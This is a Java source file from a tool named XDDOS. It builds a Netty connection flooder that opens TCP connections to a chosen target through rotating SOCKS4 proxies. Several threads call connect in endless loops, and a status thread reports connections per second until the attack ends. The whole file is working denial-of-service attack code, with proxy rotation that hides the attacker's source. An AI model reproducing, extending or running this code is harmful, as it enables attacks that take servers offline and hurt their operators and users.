package XD.XDDOS.utils;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.epoll.Epoll;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.proxy.Socks4ProxyHandler;
import io.netty.util.ResourceLeakDetector;
import io.netty.util.concurrent.Future;
import io.netty.util.concurrent.GenericFutureListener;

import java.net.InetAddress;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ThreadFactory;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.proxy.ProxyLoader;

public class NettyBootstrap {
    public static final EventLoopGroup loopGroup;
    public static final Class<? extends Channel> socketChannel;
    public static final IMethod method;
    public static final ProxyLoader proxyLoader;
    public static final ChannelHandler channelHandler;
    public static final Bootstrap bootstrap;
    public static volatile int integer = 0;
    public static volatile int nettyThreads;
    public static volatile int triedCPS = 0;
    public static final boolean disableFailedProxies;
    public static volatile int totalConnections = 0;
    public static volatile int totalSeconds = 1;
    public static Thread attack;

    static {
        nettyThreads = XDDOS.nettyThreads;
        disableFailedProxies = true;
        {
            
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                socketChannel = NioSocketChannel.class;
                loopGroup = new NioEventLoopGroup(nettyThreads, new ThreadFactory() {
                    public Thread newThread(Runnable r) {
                        Thread t = new Thread(r);
                        t.setDaemon(true);
                        t.setPriority(10);
                        return t;
                    }
                });
            } else {
                socketChannel = EpollSocketChannel.class;
                loopGroup = new EpollEventLoopGroup(nettyThreads);
            }
            System.out.println("Using "+socketChannel.getName());
        }

        method = XDDOS.method;
        proxyLoader = XDDOS.proxies;
        channelHandler = new ChannelHandler() {
            public void handlerRemoved(ChannelHandlerContext arg0) throws Exception {
            }

            public void handlerAdded(ChannelHandlerContext arg0) throws Exception {
            }

            public void exceptionCaught(ChannelHandlerContext c, Throwable t) throws Exception {
                c.close();
            }
        };
        ChannelHandler handler = new ChannelInitializer<Channel>() {
            public void channelInactive(ChannelHandlerContext ctx) throws Exception {
                ctx.channel().close();
            }

            protected void initChannel(final Channel c) throws Exception {
                try {
                    final ProxyLoader.Proxy proxy = NettyBootstrap.proxyLoader.getProxy();
                    final Socks4ProxyHandler proxyHandler = new Socks4ProxyHandler(proxy.addrs);
                    proxyHandler.setConnectTimeoutMillis(10000L);
                    proxyHandler.connectFuture().addListener(new GenericFutureListener<Future<? super Channel>>() {
                        public void operationComplete(Future<? super Channel> f) throws Exception {
                            if (f.isSuccess() && proxyHandler.isConnected()) {
                                NettyBootstrap.method.accept(c, proxy);
                            } else {
                                if (NettyBootstrap.disableFailedProxies) {
                                    NettyBootstrap.proxyLoader.disabledProxies.put(proxy, System.currentTimeMillis());
                                }

                                c.close();
                            }

                        }
                    });
                    c.pipeline().addFirst(proxyHandler).addLast(NettyBootstrap.channelHandler);
                } catch (Exception var4) {
                    c.close();
                }

            }

            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
                ctx.close();
            }
        };
        bootstrap = new Bootstrap().channel(socketChannel).group(loopGroup).option(ChannelOption.TCP_NODELAY, true).handler(handler);
    }

    public static void start() throws Throwable {
        ResourceLeakDetector.setLevel(ResourceLeakDetector.Level.SIMPLE);
        InetAddress ip = XDDOS.resolved;
        int port = XDDOS.port;

        Thread Counter = new Thread(() -> {
            if (XDDOS.duration < 1) {
                XDDOS.duration = 2147483647;
            }

            for (int i = 0; i < XDDOS.duration; ++i) {
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException var2) {
                }
                System.out.print("\r");
                System.out.print(XDDOS.GREEN_BOLD + "[" + XDDOS.RED_BOLD + "XDDOS" + XDDOS.GREEN_BOLD + "]" + XDDOS.WHITE_BOLD + " Current CPS: " + XDDOS.GREEN_BOLD + integer + XDDOS.WHITE_BOLD + " Average CPS: " + XDDOS.GREEN_BOLD + totalConnections / totalSeconds + XDDOS.WHITE_BOLD + " TARGET CPS: " + XDDOS.GREEN_BOLD + triedCPS + XDDOS.WHITE_BOLD + " Time Left: " + XDDOS.RED_BOLD + (XDDOS.duration - totalSeconds) + " sec" + XDDOS.RESET + "                                ");
                ++totalSeconds;
                integer = 0;
                triedCPS = 0;
            }
            attack.interrupt();
            XDDOS.attackRunning = false;
            System.out.println("Attack finished!");
            System.exit(0);
        });

        Counter.setPriority(1);

        CountDownLatch latch = new CountDownLatch(1);
        int k;
        for (k = 0; k < XDDOS.loopThreads; ++k) {
            attack = new Thread(() -> {
                try {
                    latch.await();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                while (true) {
                    ++triedCPS;
                    bootstrap.connect(ip, port);
                }
            });
            attack.start();
        }

        Counter.start();
        latch.countDown();
    }
}
